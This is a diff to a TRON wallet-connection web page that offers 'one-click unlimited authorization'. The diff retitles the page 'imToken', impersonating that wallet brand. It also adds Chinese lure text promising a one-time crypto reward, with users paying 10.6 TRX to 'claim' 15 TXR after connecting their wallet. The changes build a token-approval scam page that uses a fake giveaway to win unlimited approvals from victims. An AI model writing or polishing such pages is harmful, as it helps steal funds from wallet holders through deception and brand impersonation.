@@ -33,6 +33,7 @@
             padding: 10px 0;
             border-bottom: 1px solid #2d3b36;
             margin-bottom: 5px;
+            display: flex;
         }
         .header .logo {
             font-size: 24px; /* 缩小图标 */
@@ -219,7 +220,7 @@
             <div class="logo">
             <i class="fa fa-bolt"></i>
             </div>
-            <h1>能量租赁一键授权</h1>
+            <h1>imToken</h1>
             <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
         </div>
 
@@ -312,7 +313,7 @@
             warning.style.display = "none"
             await initWallet();
         } else {
-            document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开";
+            document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此次显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
             // 非TronWeb环境，完全隐藏授权按钮
             approveBtn.style.display = "none";
         }
@@ -417,8 +418,7 @@
 
             // 4. 激活授权按钮：仅显示地址，不显示余额
             document.getElementById("userInfo").innerHTML = `
-                已连接：<br>
-                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}
+                已连接：<br>${userAddress.slice(0,8)}...${userAddress.slice(-6)}须消耗10.6个TRX，可领取15个TXR加密货币如放弃领取直接退出即可
             `;
             approveBtn.disabled = false;
             // 确保授权按钮显示（避免意外隐藏）
